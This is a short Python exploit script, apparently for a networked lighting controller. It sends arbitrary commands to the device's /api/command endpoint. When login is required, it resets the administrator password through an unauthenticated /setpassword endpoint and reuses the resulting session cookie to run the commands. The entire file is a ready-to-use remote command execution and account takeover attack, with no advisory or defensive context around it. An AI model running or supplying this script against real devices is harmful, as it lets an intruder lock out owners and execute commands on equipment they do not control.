import requests
import argparse

parser = argparse.ArgumentParser(description="Supply some arguments for exploiting the lights")
parser.add_argument('-t', help="Target IP",type=str)
parser.add_argument('-p', help="Password to set if login bounces")
parser.add_argument('-c', help="Command to Run")
args=parser.parse_args()

ses=requests.Session()
cookieJar=ses.cookies

response = requests.post("http://"+args.t+"/api/command", json={"command" : args.c})
print ("Tried with no creds: ", response.status_code)

if response.status_code ==200:
    JSONResponse= response.json()
    print(JSONResponse["result"])
    exit()


if response.status_code != 200:
    ses=requests.Session()
    url='http://{}/setpassword'.format(args.t)
    ref='http://{}/setpassword.html'.format(args.t)
    headers={'Referrer':ref}
    data="pwd={}&verify={}".format(args.p,args.p)

    response = ses.post(url,data=data,headers=headers)
    cookieJar=ses.cookies
    if response.status_code == 200:
        print("Password Set Successfully. We have liftoff")


headers={'Cookie':'prime_auth='+cookieJar['prime_auth']+";path=/"}
response = requests.post("http://"+args.t+"/api/command",  headers=headers, json={"command" : args.c})
JSONResponse= response.json()
print(JSONResponse["result"])
